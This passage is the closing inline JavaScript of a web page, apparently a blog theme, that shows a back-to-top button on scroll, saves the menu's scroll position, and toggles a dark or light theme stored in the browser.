var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};mybutton.onclick=function(){document.body.scrollTop=0;document.documentElement.scrollTop=0;window.location.hash=''}
function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft);}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>